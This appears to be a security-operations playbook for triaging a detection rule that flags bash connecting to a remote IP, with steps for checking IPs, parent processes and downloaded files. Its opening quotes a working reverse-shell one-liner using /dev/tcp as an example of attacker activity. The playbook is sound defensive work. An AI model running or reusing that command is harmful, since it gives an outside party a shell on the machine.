# How to process *Linux Reverse Shell Indicator* rule
This rule detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')

# 1. Identify
- look the RAW Event for the matched command and destination IP
- check the destination IP: if it's public IP, search it on [Shodan](https://www.shodan.io/)

# 2. Contextualize
- go to SIEM and check what happened after command has been matched:
  - new connections from public IPs ? To public IPs ? Check found IPs with [Shodan](https://www.shodan.io/) 
  - downloading entries from internet ? check downloaded file hash with [VirusTotal](https://www.virustotal.com/gui/home/search)
- go to SIEM and check the parent process name (from PID): is it legitimous?


# 3. Decide
- by default this rule is dangerous. If no good indicators are found (private IP, no further action) &rarr; Incident

# Known False Negatives
None yet.

